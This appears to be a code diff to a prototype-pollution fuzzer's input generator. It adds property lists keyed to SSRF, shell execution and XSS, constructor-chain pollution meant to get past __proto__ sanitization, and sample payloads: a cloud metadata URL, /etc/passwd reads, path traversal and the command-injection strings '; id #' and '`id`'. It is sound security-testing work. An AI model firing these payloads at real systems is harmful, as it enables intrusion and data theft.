@@ -1,12 +1,36 @@
 import { logger } from '../utils/logger.js';
 
-// Pre-allocated constant — avoids recreating this array on every call
+// Pre-allocated constant — avoids recreating this array on every call.
+// Covers multiple library categories derived from known CVEs across npm.
 const GENERIC_POLLUTION_PROPS = [
-  'block', 'debug', 'compileDebug', 'self', 'line', 'pretty', 'filename',
+  // ── Template engines (Pug, EJS, Handlebars, Nunjucks, Squirrelly) ──
+  'block', 'compileDebug', 'self', 'line', 'pretty', 'filename',
   'basedir', 'doctype', 'globals', 'filters', 'plugins', 'cache',
   'template', 'autoEscape', 'defaultFilter', 'tags', 'rmWhitespace',
   'e', 'async', 'root', 'views', 'partials', 'helpers', 'layout',
-  'outputFunctionName', 'localsName', 'destructuredLocals', 'escape'
+  'outputFunctionName', 'localsName', 'destructuredLocals', 'escape',
+  // ── HTTP / Network (SSRF, request smuggling, open redirect) ──
+  'url', 'href', 'src', 'method', 'headers', 'auth', 'proxy', 'agent',
+  'hostname', 'host', 'port', 'protocol', 'path', 'baseURL', 'timeout',
+  'socketPath', 'rejectUnauthorized', 'ca', 'cert', 'key', 'pfx',
+  // ── Config / Debug (info disclosure, behavior change) ──
+  'debug', 'verbose', 'mode', 'env', 'level', 'log', 'logger',
+  'silent', 'strict', 'production', 'development',
+  // ── Serialization / Parsing (injection, deserialization) ──
+  'reviver', 'replacer', 'parser', 'serializer', 'decoder', 'space',
+  'allowDots', 'allowPrototypes', 'parameterLimit', 'depth',
+  // ── Shell / Process (RCE) ──
+  'shell', 'cwd', 'encoding', 'stdio', 'argv', 'args', 'execPath',
+  'command', 'script', 'cmd',
+  // ── DOM / Browser (XSS, DOM clobbering) ──
+  'innerHTML', 'outerHTML', 'textContent', 'onclick', 'onerror',
+  'srcdoc', 'data', 'formAction', 'action',
+  // ── Object mechanics (constructor chain, type confusion) ──
+  'constructor', 'toString', 'valueOf', 'toJSON', 'then',
+  'Symbol.toPrimitive', 'Symbol.iterator',
+  // ── Merge / Clone behavior modifiers ──
+  'clone', 'deep', 'recursive', 'overwrite', 'isMergeableObject',
+  'customMerge', 'arrayMerge', 'cloneNode', 'nodeType', 'ownerDocument',
 ];
 
 /**
@@ -572,23 +596,70 @@ export class InputGeneration {
   applyVerticalChaining(input, config) {
     if (input.type !== 'object') return null;
 
+    // Alternate between __proto__ chains and constructor.prototype chains
+    const useConstructor = Math.random() < 0.5;
+
     try {
-      input.value.__proto__ = {
-        level1: 'polluted',
-        __proto__: {
-          level2: 'deeply_polluted',
-          __proto__: {
-            level3: 'very_deeply_polluted'
+      if (useConstructor) {
+        // Constructor chain variant — bypasses __proto__ sanitization
+        input.value.constructor = {
+          prototype: {
+            level1: 'polluted',
+            constructor: {
+              prototype: {
+                level2: 'deeply_polluted',
+                constructor: {
+                  prototype: {
+                    level3: 'very_deeply_polluted',
+                    constructor: {
+                      prototype: {
+                        level4: 'ultra_deep_polluted',
+                        constructor: {
+                          prototype: {
+                            level5: 'max_depth_polluted'
+                          }
+                        }
+                      }
+                    }
+                  }
+                }
+              }
+            }
           }
-        }
-      };
+        };
+        input.metadata.pollutionMethod = 'constructor_chain';
+      } else {
+        // __proto__ chain — depth increased to 5
+        input.value.__proto__ = {
+          level1: 'polluted',
+          __proto__: {
+            level2: 'deeply_polluted',
+            __proto__: {
+              level3: 'very_deeply_polluted',
+              __proto__: {
+                level4: 'ultra_deep_polluted',
+                __proto__: {
+                  level5: 'max_depth_polluted'
+                }
+              }
+            }
+          }
+        };
+        input.metadata.pollutionMethod = 'proto_chain';
+      }
     } catch (error) {
       input.value.__verticalChain = {
         level1: 'polluted',
         nested: {
           level2: 'deeply_polluted',
           nested: {
-            level3: 'very_deeply_polluted'
+            level3: 'very_deeply_polluted',
+            nested: {
+              level4: 'ultra_deep_polluted',
+              nested: {
+                level5: 'max_depth_polluted'
+              }
+            }
           }
         }
       };
@@ -597,7 +668,7 @@ export class InputGeneration {
 
     input.metadata.pollution = true;
     input.metadata.chainingType = 'vertical';
-    input.metadata.chainDepth = 3;
+    input.metadata.chainDepth = 5;
 
     return input;
   }
@@ -865,6 +936,23 @@ export class InputGeneration {
       // Null/undefined boundary
       { type: 'empty_string', value: '' },
       { type: 'null', value: null },
+
+      // SSRF — polluting url/href/src/proxy properties
+      { type: 'ssrf_url', value: 'http://169.254.169.254/latest/meta-data/' },
+      { type: 'ssrf_protocol', value: 'file:///etc/passwd' },
+
+      // Path traversal — polluting path/filename/basedir/cwd
+      { type: 'path_traversal', value: '../../../../../../etc/passwd' },
+
+      // Command injection — polluting shell/command/script
+      { type: 'cmd_injection', value: '; id #' },
+      { type: 'cmd_backtick', value: '`id`' },
+
+      // Array payload — triggers different code paths in merge/extend
+      { type: 'array', value: ['__UOPFUZZ_ARRAY__'] },
+
+      // Nested object — triggers recursive processing
+      { type: 'nested_object', value: { nested: { deep: '__UOPFUZZ_DEEP__' } } },
     ];
   }
 
